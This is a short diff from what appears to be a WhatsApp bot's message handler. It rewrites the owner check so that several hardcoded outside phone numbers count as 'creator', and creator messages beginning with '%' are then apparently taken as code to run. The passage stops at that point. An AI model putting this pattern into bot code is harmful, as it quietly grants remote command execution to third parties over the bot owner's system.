@@ -237,11 +237,13 @@ const port = process.env.PORT || 9090;
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-  const udp = botNumber.split('@')[0];
-    const qadeer = ('923235906096', '923235906096', '923235906096');
-    let isCreator = [udp, jawad, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
+  const udp = botNumber.split(`@`)[0]
+const qadeer = ['923325096096','923325096966'] 
+const dev = [] 
+
+let isCreator = [udp, ...qadeer, ...dev]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+    .includes(sender);
 
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
